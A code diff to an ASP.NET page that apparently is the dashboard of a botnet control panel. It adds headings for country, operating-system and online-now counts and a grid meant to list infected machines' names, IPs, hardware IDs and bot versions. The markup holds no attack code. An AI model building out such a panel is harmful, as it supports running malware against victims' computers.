@@ -84,11 +84,11 @@
             </div>
         </div>
 
-        <hr class="FirstLine"/>
+        <hr class="FirstLine" />
 
         <div class="Summary">
             <div class="OnnlineNow">
-                <asp:Label CssClass="Number" ID="lblOnnlineNow" runat="server" Text="0"></asp:Label>
+                <asp:Label CssClass="Number" ID="lblOnnlineNow" runat="server" Text="0" ></asp:Label>
                 <br />
                 <asp:Label ID="lblOnnlineNowText" runat="server" Text="ONLINE NOW"></asp:Label>
             </div>
@@ -157,17 +157,40 @@
 
         <div class="CountGrid">
             <div class="CountryCount">
-                <% //TODO: Country With Amounts %>
+                <div class="CountryCountName">
+                    <ul>
+                        <li>COUNTRY COUNT</li>
+                    </ul>
+                </div>
+                <div class="CountryCountGraph">
+                    <% //TODO: Country With Amounts %>
+                </div>
             </div>
 
             <div class="OSCount">
-                <% //TODO: OS's With Amounts %>
+                <div class="OSCountName">
+                    <ul>
+                        <li>OPERATING SYSTEM COUNT</li>
+                    </ul>
+                </div>
+                <div class="OSCountGraph">
+                    <% //TODO: OS's With Amounts %>
+                </div>
             </div>
         </div>
 
-        <div class="OnnlineNowGrid">
-            <div class="OnnlineNow">
-                <% //TODO: GridVieuw with ID/PCNAME/IP/CPU/GPU/INSTALDATE/LASTCON/OS/COUNTRY/REGION/HARDWAREID/VERSIONOFBOT %>
+        <div class="OnlineNowGrid">
+            <div class="OnlineNow">
+                <div class="OnlineNowName">
+                    <ul>
+                        <li>ONLINE NOW</li>
+                    </ul>
+                </div>
+                <div class="OnlineNowGraph">
+                    <% //TODO: GridVieuw with ID/PCNAME/IP/CPU/GPU/INSTALDATE/LASTCON/OS/COUNTRY/REGION/HARDWAREID/VERSIONOFBOT %>
+                    <asp:GridView ID="GridView1" runat="server" Height="164px" Width="1118px">
+                    </asp:GridView>
+                </div>
             </div>
         </div>
     </form>
